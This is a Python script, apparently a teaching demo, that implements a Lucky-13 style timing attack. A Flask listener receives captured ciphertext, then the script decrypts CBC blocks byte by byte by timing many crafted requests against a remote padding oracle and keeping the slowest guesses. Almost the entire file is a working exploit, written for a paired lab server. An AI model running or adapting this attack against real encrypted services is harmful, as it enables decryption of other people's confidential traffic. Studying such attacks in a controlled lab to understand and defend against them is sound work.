#!/usr/bin/env python3
"""
Lucky-13 style timing attacker demo.
Run this in Terminal 2.

Receives ciphertext from lucky13_server.py, then decrypts CBC blocks
by choosing guesses with slower oracle timing.
"""

import logging
import socket
import threading
import time

import requests as http_req
from flask import Flask, jsonify, request

BLOCK_SIZE = 16
MAC_SIZE = 32
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 6001
ORACLE_PORT = 6000
FAST_SAMPLES = 2
REFINE_SAMPLES = 8
TOP_CANDIDATES = 6

app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

captured_event = threading.Event()
captured_hex = {"value": ""}


@app.route("/capture", methods=["POST"])
def capture():
    ct_hex = request.get_json(force=True).get("ciphertext", "")
    if ct_hex:
        captured_hex["value"] = ct_hex
        captured_event.set()
    return jsonify({"status": "ok"})


def fmt(data):
    return " ".join(str(b) for b in data)


def get_local_ip():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def oracle_time_ns(two_blocks):
    t0 = time.perf_counter_ns()
    try:
        http_req.post(
            app.config["ORACLE_URL"],
            json={"ciphertext": two_blocks.hex()},
            timeout=5,
        )
    except Exception:
        return 10**12
    return time.perf_counter_ns() - t0


def median_ns(samples):
    values = sorted(samples)
    mid = len(values) // 2
    if len(values) % 2 == 1:
        return values[mid]
    return (values[mid - 1] + values[mid]) // 2


def guess_score(two_blocks, samples):
    times = [oracle_time_ns(two_blocks) for _ in range(samples)]
    return median_ns(times), samples


def lucky13_attack(ct_hex):
    data = bytes.fromhex(ct_hex)
    blocks = [data[i:i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
    num_ct_blocks = len(blocks) - 1

    print("\n" + "=" * 60)
    print("LUCKY-13 TIMING ATTACK")
    print(f"Ciphertext bytes: {len(data)}")
    print(f"Blocks          : 1 IV + {num_ct_blocks} ciphertext")
    print(f"Oracle          : {app.config['ORACLE_URL']}")
    print("=" * 60)

    recovered = b""
    query_count = 0
    start = time.time()

    for blk_num in range(1, len(blocks)):
        prev_block = blocks[blk_num - 1]
        target_block = blocks[blk_num]
        inter = bytearray(BLOCK_SIZE)

        print(f"\n--- Decrypting block {blk_num}/{num_ct_blocks} ---")

        for pos in range(BLOCK_SIZE - 1, -1, -1):
            pad_val = BLOCK_SIZE - pos
            crafted = bytearray(BLOCK_SIZE)
            for j in range(pos + 1, BLOCK_SIZE):
                crafted[j] = inter[j] ^ pad_val

            best_guess = 0
            best_score = -1

            fast_rank = []
            for guess in range(256):
                crafted[pos] = guess
                score, used = guess_score(bytes(crafted) + target_block, FAST_SAMPLES)
                query_count += used
                fast_rank.append((score, guess))

            fast_rank.sort(reverse=True)
            for _, guess in fast_rank[:TOP_CANDIDATES]:
                crafted[pos] = guess
                score, used = guess_score(bytes(crafted) + target_block, REFINE_SAMPLES)
                query_count += used
                if score > best_score:
                    best_score = score
                    best_guess = guess

            inter[pos] = best_guess ^ pad_val
            p = prev_block[pos] ^ inter[pos]
            ch = chr(p) if 32 <= p < 127 else "."
            print(
                f"  Byte {BLOCK_SIZE - pos:2d}/16 -> guess={best_guess:3d}, "
                f"pt={p:3d} ('{ch}'), score={best_score} ns"
            )

        pt_block = bytes(prev_block[i] ^ inter[i] for i in range(BLOCK_SIZE))
        recovered += pt_block
        print(f"  Recovered block bytes: {fmt(pt_block)}")

    # Remove PKCS#7 padding.
    plain = recovered
    if plain:
        p = plain[-1]
        if 1 <= p <= BLOCK_SIZE and plain[-p:] == bytes([p]) * p:
            plain = plain[:-p]

    # Remove trailing HMAC if present (TLS-style record).
    msg_only = plain[:-MAC_SIZE] if len(plain) >= MAC_SIZE else plain

    elapsed = time.time() - start
    print("\n" + "=" * 60)
    print("RESULT")
    print(f"Recovered (msg||mac) bytes : {fmt(plain)}")
    print(f"Recovered message bytes     : {fmt(msg_only)}")
    try:
        print(f"Recovered message text      : {msg_only.decode()}")
    except UnicodeDecodeError:
        pass
    print(f"Total queries               : {query_count}")
    print(f"Time                        : {elapsed:.2f}s")
    print("=" * 60 + "\n")


def main():
    local_ip = get_local_ip()
    server_ip = input("Enter server PC IP (blank for localhost): ").strip() or "127.0.0.1"
    app.config["ORACLE_URL"] = f"http://{server_ip}:{ORACLE_PORT}/lucky13_oracle"

    threading.Thread(
        target=lambda: app.run(host=LISTEN_HOST, port=LISTEN_PORT, threaded=True),
        daemon=True,
    ).start()

    print("=" * 60)
    print("LUCKY-13 ATTACKER")
    print(f"This PC IP : {local_ip}")
    print(f"Oracle URL : {app.config['ORACLE_URL']}")
    print(f"Listening  : http://{local_ip}:{LISTEN_PORT}/capture")
    print("=" * 60)
    print("\nWaiting for ciphertext...\n")

    while True:
        captured_event.wait()
        captured_event.clear()

        ct_hex = captured_hex["value"]
        print(f"Ciphertext received: {len(bytes.fromhex(ct_hex))} bytes")
        lucky13_attack(ct_hex)
        print("Waiting for next ciphertext...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBye.")
